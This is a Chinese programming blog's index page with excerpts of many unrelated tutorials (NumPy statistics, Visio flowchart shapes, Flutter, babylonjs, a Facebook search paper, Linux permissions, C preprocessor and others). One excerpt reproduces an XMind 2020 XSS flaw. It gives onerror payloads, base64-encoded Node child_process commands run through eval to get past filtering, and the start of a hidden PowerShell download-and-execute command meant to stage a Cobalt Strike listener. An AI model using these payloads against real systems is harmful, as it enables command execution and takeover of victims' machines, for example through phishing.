<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b80ec6a6d79afd063156882c7af06489/" rel="bookmark">
			PML之平均 、中值 、众数、标准偏差、方差
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		NumPy模块为此提供了一种方法，可以计算平均、中值和众数
1、平均值
import numpy as np value=[2,4,6,14,34,88,98,17,47] #计算平均值 mean=np.mean(value) print(mean) 结果：
34.44444444444444 2、中值
#计算中值 med=np.median(value) print(med) 结果：
17.0 3、众数
import numpy as np from scipy import stats value=[2,4,6,14,34,2,2,88,98,17,47] #众数 mod=stats.mode(value) print(mod) 结果：
ModeResult(mode=array([2]), count=array([3])) 众数是2，出现了3次
4、标准偏差
标准偏差是一个数字，描述值的分散程度。
低标准偏差意味着大多数数字接近均值（平均值）。
高标准偏差表示这些值分布在更宽的范围内。
#标准偏差 x = np.std(value) print(x) 结果：
33.4374956553639 5、方差(Variance)
方差是另一个数字，指示值的分散程度。
实际上，如果采用方差的平方根，则会得到标准偏差！
或反之，如果将标准偏差乘以自身，就可以得到方差！
#方差（每个值减去平均值的结果取平方，然后除以总数） va = np.var(value) print(va) 结果：
1118.0661157024792 注意：
标准偏差通常用符号Sigma：σ
方差通常用符号Sigma Square: σ2
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9984bea95dbdff4f6a1c1a96cd7bb0d7/" rel="bookmark">
			XMind 2020 XSS漏洞复现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.前言 漏洞危害：可以花样构造相关参数，执行系统命令，获取用户权限，攻击者可以借助该漏洞实现命令执行，在实际环境中借助钓鱼攻击可能造成更严重的危害，我看网上相关复现文章都贴着这句话，其实也就是这样的，XMind xss漏洞的确可以被利用执行一些像弹窗，执行命令(经典ipconfig命令，弹计算器)，以及配合cs的使用，如果真的有有心人去利用这个漏洞的话，也是很容易中招的。下面放上下载地址。
下载地址下载XMind 2020版本
二.漏洞利用 1.xss弹窗 创建
写入命令
在思维导图红色部分（不止红色部分，后面的分支主题1,2,3都可以）
&lt;img src=x onerror=alert("qwer")&gt; &lt;audio src=x onerror=alert("qwer")&gt; 好像只有这类标签的弹窗才行，其余还是有被过滤的
3. 执行
在大纲中选中命令，按任意一个功能键（如：Ctrl，Alt，Ctrl+C等等）
必须选中最后的&gt;符号，其余的可选可不选。
2.命令执行 （1）ipconfig 利用命令：
const tenet = require('child_process')tenet.exec('ipconfig /all',(error, stdout, stderr)=&gt;{alert(`stdout: ${stdout}`);}); 整体语句：
&lt;img src=x onerror='eval(new Buffer(const tenet = require('child_process')tenet.exec('ipconfig /all',(error, stdout, stderr)=&gt;{alert(`stdout: ${stdout}`);});))'&gt; 但是直接贴上去的话
还是稍有防护的，需要进行base64加密
emmmm，虽然编码有点问题，但还是能看到一些关键信息的，这里Buffer后网上都说要加一个空格否则会出错，其实出问题的话和这里应该是没关系的(Buffer起到绕过作用)。
（2）弹计算器 利用命令：
require('child_process').exec('calc.exe',(error, stdout, stderr)=&gt;{alert(stdout: ${stdout});}); 最终命令：
&lt;img src=x onerror='eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2NhbGMuZXhlJywoZXJyb3IsIHN0ZG91dCwgc3RkZXJyKT0+e2FsZXJ0KGBzdGRvdXQ6ICR7c3Rkb3V0fWApO30pOw==`,`base64`).toString())'&gt; 3.结合cs 这里我一直连接不上可能是我连接的姿势还是有点问题，先把方法步骤丢到这里，以后发现问题了再回来更改吧
打开cs监听器 powershell powershell.exe -nop -w hidden -c "IEX ((new-object net.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9984bea95dbdff4f6a1c1a96cd7bb0d7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2b63cd5345b13865722641324658575/" rel="bookmark">
			c语言流程图形状什么意思,Visio中的基本流程图的各个形状的含义是什么？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、矩形：一般用作要执行的处理(process)，在程序流程图中做执行框。2、圆角矩形或者扁圆：表示程序的开始或者结束，在程序流程图中用作为起始框或者结束框。3、斜角矩形：斜角矩形平时几乎不使用，可以视情况自行定义。或者在其他的流程图中，有特殊含义，暂不知晓，也希望有识之士指点一二。4、菱形：表示决策或判断(例如：If...Then...Else),在程序流程图中，用作判别框。5、文件：表达为一个文件，可以是生成的文件，或者是调用的文件。如何定义，需要自己根据实际情况做解释。6、括弧：注释或者说明，也可以做条件叙述。一般流程到一个位置，做一段执行说明，或者特殊行为时，会用到它。7、半圆形：半圆在使用中常作为流程页面跳转、流程跳转的标记。8、三角形：控制传递，一般和线条结合使用，画数据传递。9、梯形：一般用作手动操作。10、椭圆形或圆形：如果画小圆，一般是用来表示按顺序数据的流程。11、六边形：表示准备之意，大多数人用作流程的起始，类似起始框。12、平行四边形：一般表示数据，或确定的数据处理。或者表示资料输入(Input)。13、角色：来自于usecase用例，模拟流程中执行操作的角色是谁。需要注意的时，角色并非一定是人，有时候是机器自动执行，有时候也可是是模拟一个系统管理。14、数据：就是指保存我们网站数据的数据库。15、图片：表示一张图片，或者置入一个已经画好的图片、流程或者一个环境。扩展资料：在Visio中如果是画页面流程图，那么也可以用矩形指代一个页面。有时候会把页面和执行命令放在同一个流程中做说明，这个时候将两类不同的矩形做色彩区别，然后做说明就好了。其实Visio里面由于不涉及到具体的程序流程，所以有些标准的图形并没有提供，如不规则图形、侧面双矩形等。大多数情况下，还是自己自定义一下自己的符号标准，就跟prd文档加上名词解释一样，才是解决方法。
阅读全文 &gt;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a86af622e873eb410c65d8250e6f1226/" rel="bookmark">
			Flutter开发之——网络请求-JsonToDart插件解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一 概述 JsonToDart是一个IDE插件，可以快速将Json转换为Dart数据类插件安装完成后，通过File—&gt;New —&gt;JsonToDart，填入Json字符串即可完成Dart转换 二 JsonToDart插件 2.1 IDE插件安装 依次点击：File—&gt;Settings—&gt;Plugins，搜索 JsonToDart
2.2 JsonToDart的使用 在创建文件的位置，右键：New—&gt;JsonToDart
将Json结果填入文本框中，输入类名，点击Generate生成此类
三 旧类替换并显示 3.1 代码 Future&lt;Article3&gt; futureArticle3; @override void initState() { super.initState(); futureArticle3=_httpGet2(); } //显示 FutureBuilder&lt;Article3&gt;( future: futureArticle3, builder: (context, snapshot) { if (snapshot.hasData) { return ListView.separated( itemCount: snapshot.data.data.datas.length, separatorBuilder: (context, index) {return Divider(height: 10, color: Colors.grey,);}, itemBuilder: (BuildContext context, int index) { return Column( children: [ Text("${snapshot.data.data.datas[index].author}"), Text("${snapshot.data.data.datas[index].title}"), Text("${snapshot.data.data.datas[index].niceShareDate}") ], ); }, ); } else if (snapshot.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a86af622e873eb410c65d8250e6f1226/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a972fbcdb0ae3e972a29cf44df5e1d92/" rel="bookmark">
			从模型制作（3dmax）到网页显示（babylonjs）全过程介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这篇文章将初浅地介绍怎样从三维软件（本文使用3dmax）中建立模型并导出为gltf模型在网页上显示（babylonjs）的全过程。
小场景效果
目录
3dmax端
1、建模篇
2、材质与贴图篇
3、灯光
导出为GLTF
babylonjs端
1、Typescript介绍
2、Typescript项目的搭建与打包
3、babylonjs模型显示
4、总结
5、参考资料
项目文件：链接：https://pan.baidu.com/s/1SPJ1vH2GFJOZIT2-B_y6PA 提取码：uuxc 3dmax端 1、建模篇 一个三维模型由点、线、面组成。
台灯 台灯-线框图
台灯底座-线框图
在三维软件（3dmax、blender、maya等）中，通过对基础几何体（平面、长方体、球体、柱体、锥体）的编辑变换组合形成一个个的三维网格。例如制作一个枕头的模型，首先建立一个立方体，然后对该立方体设置cloth变换即可。
枕头制作过程
在3Dmax中对基本几何的编辑操作有：平移、缩放、旋转、网格编辑算法等。
由于本人非专业建模技术人员，不熟悉上面所列编辑算法，为了构建一个小场景用于测试，从网络上下载了相关子模型，包括小桌、台灯模型。
建模步骤：1、从sketchfab下载了台灯和桌子的模型；
2、建立正交的三面墙体；
3、导入小桌子模型（fbx格式），进行缩放、平移到场景中；
4、导入台灯模型（3ds格式），平移到桌子上；
5、最终建立的小场景。
小场景线框图 没有贴图的小场景面图
2、材质与贴图篇 在我们的现实世界中，存在各种各样不同的材质，例如布料、木料、玻璃、金属，这些材质在外观上、物理特性上有着不同程度的区别，例如玻璃可以透光、表面光滑、可以反射周围的环境，金属不透明但可以反射更强的光，等等。
为了模拟现实环境中不同的材质，在三维软件中设置了很多的材质属性去调节，例如基础色、反射率、透明度、金属度等等。
但是，由于现实环境特别复杂，三维软件中难以精细化地设置模型每一处的材质，为了方便，人们常常使用拍摄或者电脑制作的图片附加在模型表面，然后在此基础上设置一些参数来模拟物体材质。
在众多的技术中，当下属基于物理的渲染过程（Physically Based Rendering，PBR）最为流行，它广泛应用于游戏（刺激战场、极品飞车）、动画（无敌破坏王）、影视（阿凡达、流浪地球）等领域中，与传统的Lambert着色和Phong着色相比，PBR着色在效果上有质的提升，其能达到更加逼真的效果。PBR有以下几个优势：1、不同的艺术家提供统一的工作流程；2、方法论和算法基于精确的计算公式，免除创作表面的猜想过程；3、在任何光照环境都能表现出正确的结果。
在基于物理纹理的渲染（PBR）中，有两种最常见的工作流程，即金属/粗糙度和高光反射/光泽度。在使用过程中，两种工作流程各有利弊（详见PBR-Guide）。
金属/粗糙度和高光反射/光泽度工作流程
现阶段，各个软件对PBR的支持也越来越好了，3Dmax 2021重点更新了支持PBR的功能。制作PBR贴图的常用工具Substance系列软件，免费下载材质的地址有：Texturehaven。
本例的小场景中，只有墙的材质需要从自己单独下载贴图，桌子和台灯在素材中有贴图。
步骤：1、为桌子重新链接贴图；
2、为台灯重新链接贴图；
3、为墙体添加贴图；由于图片大小限制，未能展示所有贴图添加过程，其余贴图以同样的方式自行添加。
场景效果图
3、灯光 与现实场景一样，还需要灯光才能点亮整个场景。在软件中，常用的有点光（类似灯泡，向四周发光）、聚光灯（一定范围内发光）、面光（类似窗户光）、太阳光（从很远的地方平行照射）。
本场景中在台灯中添加一个点光即可。
至此 ，可以使用渲染器渲染了，小场景算构建完成。
场景中只有一个光源，物体还不够亮。可以通过添加（渲染&gt;环境&gt;环境贴图）HDR环境光来弥补；
另外，还可以直接在渲染&gt;渲染到纹理 菜单中选择导出lightmap。
导出为GLTF GLTF格式是由Khronos Group制定的一种3D格式，在2017年发布GLTF 2.0。该格式可以有效率的在网络上传输和加载，它最小化了3D资产，同时它还支持扩展，用户可根据需求自定义字段。gltf可以作为一种3D交付格式，允许整个行业对其自由操作3D内容，简化了创作流程和交互服务。
Khronos Group制定的标准
现阶段，各个厂家也在逐渐支持gltf文件。skechfab将fbx、obj等常用格式转为gltf在网页预览并下载；高德地图支持直接在地图上指定位置显示gltf文件；3dmax、blender、maya、revit等三维软件可以直接或间接导出为gltf文件；threejs、babylonjs等web三维显示引擎可以直接显示gltf文件;windows 10系统中自带的3D查看器可直接预览gltf文件。
整个GLTF资产由三类文件组成，一个json文件，它是gltf的核心文件，描述了三维模型的结构和组成；一个二进制文件，其存储了顶点数据、着色方式、动画等信息；还有一类jpg或png格式的图片，它们是资产中使用的贴图。gltf的详细解释如下：
在本例中，在3dmax中使用babylonjs插件导出为gltf格式。
win10中3D查看器预览的效果图
babylonjs端 1、Typescript介绍 Typescript是微软开发的一个开源编程语言，其本身是为了解决JavaScript语言本身的局限性，难以胜任和维护大型项目开发，作者是C#的首席架构师安德斯·海尔斯伯格。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a972fbcdb0ae3e972a29cf44df5e1d92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5178d384b8d15a7162b8ac8bf99c40b/" rel="bookmark">
			【PaperNotes】Embedding-based Retrieval in Facebook Search
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		论文地址: ACM：https://dl.acm.org/doi/10.1145/3394486.3403305
arXiv：https://arxiv.org/abs/2006.11632
这是一篇Applied Data Science Track Paper，非Research Track Paper，侧重于工业界技术的落地。 从标题可以看出，论文介绍了Facebook（以下简称FB）的向量召回技术，也就是Embedding-Based Retrieval（EBR）。让我们开始吧，祝开卷有益！ 1. 预备知识 首先，搜索引擎的匹配策略按照查询关键词（Query）是否完全命中文档（Document，以下简称doc），可以分为两大类：term matching（以下译作文本匹配）与semantic matching（语义匹配）。
文本匹配，能够做到完全精确的匹配（Exact Match）。如果是中文，通常先对query进行分词，得到更细粒度的词（Term）；再用term去检索doc，term出现于doc则命中；然后取各个term检索结果的交集返回。
我之前看过一点《Introduction to Information Retrieval》，它的第一章就在讲布尔召回（Boolean Retrieval），正是上面这一套传统的做法。如果本文点赞破100，我就是不吃不喝也要啃完这部经典，与诸君交流分享。
语义匹配，不再追求完全精确的匹配，而是力图满足用户的搜索意图（Search Intent），也就是意会。用户输入的query，只是Ta搜索意图的一种表达形式而已，比如“美国前总统”、“唐纳德・特郎普”、“川普”都是“懂王”。要表示用户意图，就用到了本文的主角embedding，一种用稠密向量（Dense Vector，没有特殊说明，后文的向量都指稠密向量）来表征对象的形式（Representation）。然后基于query embedding与doc embedding来计算结果。
一个有趣的说法：万物皆可embedding。没那么高深，就是用向量来表示对象，然后用向量之间的计算来表示对象之间的关系。换个说法，如果你是一个丹青圣手，万物皆可入画，你可以用画中世界来反映现实世界。Embedding也是类似，不过是以它的方式来描摹这个世界。
按阶段划分，搜索引擎通常有两个大的步骤：召回（Retrieval）与排序（Ranking）。召回，算是一个比较生僻的词，新闻里偶尔报道“问题产品的召回”，搜索中召回是同样的意思，就是尽可能把涉及的相关的doc一个不漏找全了，宁抓错不放过，前文的两类匹配策略也可以说是召回策略；排序的话，就是在召回的基础上，把更相关的、更符合用户意图的doc排在更显眼的位置。
说到这儿，论文将要介绍的EBR应该比较清晰了：用embedding来表示query与doc，得到query embedding与doc embedding，将召回问题转化为向量空间中的最近邻搜索问题。
在搜索召回时应用EBR的一个挑战是：召回是万里挑一的工作，从海量的数据——上千万甚至亿级的doc中，找出成百上千相关的doc。这对于embeddings的训练与使用都是极其严峻的考验。
且看，FB是如何迎难而上的。
2. 本文工作 FB按照阶段划分了面临的挑战，并提出了不同的解决方案：
建模（Modeling）。他们提出了unified embedding——一个双塔模型，一端是query，另一端是doc；
服务（Serving）。针对多通道召回（EBR 与布尔召回）的问题，他们开发了一个混合召回框架；
全栈优化。为了对整个搜索系统进行全面的优化，他们将embeddings 集成到了排序层，构造了一个数据闭环，以学习更好的embeddings。
上图是FB的EBR召回系统的概览，各位不妨先花两分钟研究一下，再继续往下看。
2.1 建模 搜索召回任务可以公式化为召回优化问题，即给定query、与query相关的doc全集 、模型召回的topK个结果 ，最大化：也就是，尽可能将相关的doc找全了。
前文提到EBR将召回问题转化为向量空间中的最近邻搜索问题，EBR模型返回的topK个结果就是“向量空间中，与query embedding‘距离’最近的doc embeddings表示的K个docs”。
建模的目的就在于：如何构造query embedding与doc embedding。在此，FB并没有太多的创新，使用了目前业界常用的双塔模型——用两个神经网络分别作为query与doc的编码器，如下所示。
与常规方法（仅文本进行编码）不同的是，他们在query侧与doc侧都加入了辅助特征，比如query侧加入了用户的位置、社交关系等，是为unified（大一统的） embedding。
值得注意的是，对于类别特征（Categorical Feature），他们的处理与文本一样，先做embedding，再将得到的特征向量输入编码器，同其他特征一起计算unified embedding。
从信息的视角来看，unified embedding的有效性高度依赖于添加的特征补充的信息量。
文章简要介绍了几点特征工程的工作：
文本特征：通过char n-gram补充了subword信息；
位置特征：在query侧，补充了搜索发起者的城市、地域、国家、使用语言；在document侧，补充了开放性的位置信息，比如群组的位置；
社交embedding特征：为了更好地利用社交网络信息，基于社交图谱训练了一个embedding模型。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a5178d384b8d15a7162b8ac8bf99c40b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a7988020dd6d7cb047e4a76f2221a00f/" rel="bookmark">
			python programming training(一)：最大回文子字符串
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概念 回文字符串是指一个字符串从左到右与从右到左遍历得到的序列是相同的。例如“abcba“就是回文字符串，而"abcab"则不是回文字符串。
回文字符串给定一个字符串，求它最长的回文子串长度，例如输入字符串'35534321'，它的最长回文子串是'3553'，所以返回4。
方法 求回文字符串的方法
目录
概念
方法
1. 暴力枚举法
2. 中心搜索法
3. 中心扩展法
github地址
分析与解答：
最容易想到的方法为遍历字符串所有可能的子串（暴力法），判断其是否为回文字符串看，然后找出最长的回文字串。但是当字符串很长的时候，这种方法的效率是非常低下的，因此这种方法不可取。
给定字符串"",假设p(i, j)=1表示“”是回文字符串；P(i, j)=0表示“”不是回文字符串；
如果:那么P(i, i+1)=1,否则P(i, i+1) =0.
如过:那么P(i+1, j+1)=p(i, j). ————————————————
版权声明：本文为CSDN博主「灬蜡笔灬」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/qq_42013574/article/details/88825930
1. 暴力枚举法 从长到短遍历，找到所有子串,判断每一个子串是否是回文.即a==a[::-1]
参考：https://blog.csdn.net/wangweimic/article/details/93977486
# 从长到短，依次遍历判断所有的子字符串,st= st[::-1] def get_reverstring(string): substring_length = len(string) while substring_length &gt; 0: for i in range(len(string) - substring_length + 1): # 因为从长到短，需要遍历[0:17]；[0:16]、[1:17]...，所以需要另一个循环在每次更新要检测的子字符串长度时，重置上面的range()函数. # i从一开始的0到0，1到0，1，2，是在被减去的数值范围内循环遍历 # 另一方面，依次递减需要检测的子字符串的长度，直到子字符串为空，长度为0，这是一个典型的while循环呀。 # 最后需要测试，检验代码是否正常运行 temp = string[i: i + substring_length] if temp == temp[::-1]: return temp substring_length -= 1 print get_reverstring("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a7988020dd6d7cb047e4a76f2221a00f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb023f4851dd47c91b13e8f188cabab1/" rel="bookmark">
			Linux改变文件属性与权限
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 chgrp ：改变文件所属群组
 chown ：改变文件拥有者
 chmod ：改变文件的权限, SUID, SGID, SBIT 等等的特性
chgrp
[root@study ~]# chgrp [-R] dirname/filename ... 选项与参数： -R : 进行递归(recursive)的持续变更，亦即连同次目录下的所有文件、目录 都更新成为这个群组之意。常常用在变更某一目录内所有的文件之情况。 范例： [root@study ~]# chgrp users initial-setup-ks.cfg [root@study ~]# ls -l -rw-r--r--. 1 root users 1864 May 4 18:01 initial-setup-ks.cfg [root@study ~]# chgrp testing initial-setup-ks.cfg chgrp: invalid group: `testing' &lt;== 发生错误讯息啰～找不到这个群组名～ chown 记住第一个是拥有者，第二个是群组
[root@study ~]# chown [-R] 账号名称 文件或目录 [root@study ~]# chown [-R] 账号名称:组名 文件或目录 选项与参数： -R : 进行递归(recursive)的持续变更，亦即连同次目录下的所有文件都变更 范例：将 initial-setup-ks.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb023f4851dd47c91b13e8f188cabab1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/238c24047f26cda1b9f3c8fd20dca4cd/" rel="bookmark">
			使用MVC实现简单的用户登录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、数据表结构与内容 2、代码实现 注意：
（1）表单的提交地址为“lgServlet”。这在我们之后的Servlet的配置中需要用到。
（2）提交的方式是“post”方式。这决定了调用Servlet的哪个方法。
（3）2个文本框控件的name属性为“username”、“password”。这
（4）我们还需要2个简单的成功"result_succ.jsp"、登陆失败"result_err.jsp"画面
login.jsp
&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;login&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action="lgServlet" method="post"&gt; 用户名：&lt;input type="text" name="username"/&gt; 密&amp;emsp;码：&lt;input type="password" name="password"/&gt; &lt;input type="submit" value="登录"/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; result_err.jsp
&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;error&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;${info}&lt;/p&gt; &lt;% PrintWriter pat = response.getWriter(); pat.println("&lt;html&gt;"); pat.println("&lt;head&gt;"); pat.println("&lt;body&gt;"); pat.println("&lt;a href='./login.jsp'&gt;返回&lt;/a&gt;"); pat.println("&lt;/body&gt;"); pat.println("&lt;/head&gt;"); pat.println("&lt;/html&gt;"); %&gt; &lt;/body&gt; &lt;/html&gt; result_succ.jsp
&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;result&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;${info}&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; DbPreparedUtil.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/238c24047f26cda1b9f3c8fd20dca4cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee472439a3658a7a2f110972a42d3f5e/" rel="bookmark">
			请教modelsim中vlog的用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 对于初学者，modelsim自带的教程是一个很好的选择，在Help-&gt;SE PDF Documentation-&gt;Tutorial里面.它从简单到复杂、从低级到高级详细地讲述了modelsim的各项功能的使用，简单易懂。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/72cc282f6145df442cf3184b11b0f45f/" rel="bookmark">
			c语言 ifdef用法,条件编译ifdef_ifndef_endif用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		8种机械键盘轴体对比
本人程序员，要买一个写代码的键盘，请问红轴和茶轴怎么选？
前言
C语言中的预处理功能有三种,分别是宏定义,文件包含和条件编译,这里说的就是”条件编译”.
其实看名字就能看出来,满足一定条件才进行编译,是给编译器看的.
只要学过if else语句的人,就能很容易理解这个.
#ifdef
就是”if define”的意思,即”如果定义了”1
2
3
4
5#ifdef 标识符1
程序段1
#else
程序段2
#endif
如果定义过标识符1,那就执行程序段1,负责执行程序段2.也可以有如下用法:1
2
3#ifdef 标识符1
程序段1
#endif
#ifndef
“if not define”,如果没有定义过.1
2
3
4
5#ifndef 标识符1
程序段1
#else
程序段2
#endif
如果没有定义过标识符1,就执行程序段1,负责执行程序段2.也可以有如下用法:1
2
3#ifndef aaa
#define aaa a*a*a
#endif
#if1
2
3
4
5#if 表达式1
程序段1
#else
程序段2
#endif
作用&amp;例子防止重复定义
当你在a.h中定义了一个”某变量”,然后在b.h中包含了a.h的头文件,接着在c.h中包含了a.h的头文件,最后你又在test.c中包含了a.h和c.h两个头文件.这样就相当于你在test.c中定义了两遍某变量啊,c语言是不允许重复定义的(声明是可以重复的),所以你得告诉编译器,我如果定义过某变量你就别再给我编译这句话了,如果没定义过,再编译.
举例
a.h1
2#include #include "b.h"
b.h1#include "a.h"
c.c1
2
3
4
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/72cc282f6145df442cf3184b11b0f45f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e1c6dfed21a556b269517fdd1f9500c/" rel="bookmark">
			基于vue的iviewui组件应用和封装开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IviewUI官方文档
目录 什么是iviewUI?应用组件及语法引用页面布局LayoutDivider 分割线Menu 导航菜单Tabs 标签页Switch 开关Select 选择器InputNumber 数字输入框Message 全局提示Modal 对话框BackTop 返回顶部Table组件Rate 评分树组件拖拽 路由 什么是iviewUI? View UI®，即原先的 iView，是一套基于 Vue.js 的开源 UI 组件库，主要服务于 PC 界面的中后台产品。
应用组件及语法 引用 在项目生产和开发配置文件中注入组件的依赖：
"iview": "^3.5.4", 在项目前端入口文件中实例化vue时，注册vue中
import ViewUI from 'view-design'; import 'view-design/dist/styles/iview.css'; Vue.use(ViewUI); 组件注册：
import Vue from 'vue'; //导入组件 import FieldyhmListfrom './fieldyhmList'; //注册组件y-field-list：为组件中自定义的标签名 Vue.component('y-field-list', FieldyhmListfrom ); //默认导出所有 export default {}; 下面在对应模块中直接引用你自定义好的标签即可 页面布局Layout 页面主题配置： &lt;template&gt; &lt;div class="layout"&gt; &lt;Layout&gt; &lt;Sider ref="side1" hide-trigger collapsible :collapsed-width="78" v-model="isCollapsed"&gt; &lt;Menu active-name="1-2" theme="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e1c6dfed21a556b269517fdd1f9500c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/336a9ae95339c5a2d3cf81fc9b7e2b05/" rel="bookmark">
			webrtc-m79-视频解码的流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 函数调用关系图 2 代码 void VideoReceiveStream::Start() { RTC_DCHECK_RUN_ON(&amp;worker_sequence_checker_); if (decoder_running_) { return; } const bool protected_by_fec = config_.rtp.protected_by_flexfec || rtp_video_stream_receiver_.IsUlpfecEnabled(); frame_buffer_-&gt;Start(); if (rtp_video_stream_receiver_.IsRetransmissionsEnabled() &amp;&amp; protected_by_fec) { frame_buffer_-&gt;SetProtectionMode(kProtectionNackFEC); } transport_adapter_.Enable(); rtc::VideoSinkInterface&lt;VideoFrame&gt;* renderer = nullptr; if (config_.enable_prerenderer_smoothing) { incoming_video_stream_.reset(new IncomingVideoStream( task_queue_factory_, config_.render_delay_ms, this)); renderer = incoming_video_stream_.get(); } else { renderer = this; } for (const Decoder&amp; decoder : config_.decoders) { std::unique_ptr&lt;VideoDecoder&gt; video_decoder = decoder.decoder_factory-&gt;LegacyCreateVideoDecoder(decoder.video_format, // VideoDecoderFactory::LegacyCreateVideoDecoder config_.stream_id); // If we still have no valid decoder, we have to create a "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/336a9ae95339c5a2d3cf81fc9b7e2b05/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83706d30eb3a59fbd45cf42bef329617/" rel="bookmark">
			Pytest学习—pycharm运行pytest
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		说明 平常我们一般是通过Pycharm来编写代码的，在写完用例之后需要调试代码来检测其功能是否正常，如果我们每次用例写完之后都去cmd去运行的话会变得十分费力和效率低下，所以在这里介绍一下如何试用pycharm运行用例。
方法使用 Pycharm运行脚本有三种方式：
1、当写的代码中没有uniitest和pytest框架时，而且py文件名称也不是以test_格式命名的，这是pycharm就会以正常的普通脚本进行运行调试。
2、当使用了unittest而没有使用pytest框架时，而且py文件是以test_xxx.py格式保存的，那Pycharm会自动进行识别以unittest形式进行运行程序。
3、当使用了pytest框架时，而且py文件是以test_xxx.py格式保存的，那Pycharm会以pytest形式进行运行程序，不过在这里要对pycharm进行一个设置。选择Settings-Tools-Python Integrated Tools
,然后选择Pytest点击确定即可。
设置完成后，Pycharm就会以pytest形式运行脚本。
pycharm运行结果的话成功的用.表示，失败的用Fail表示。
以上就是Pycharm运行pytest的方法，其实也很简单。
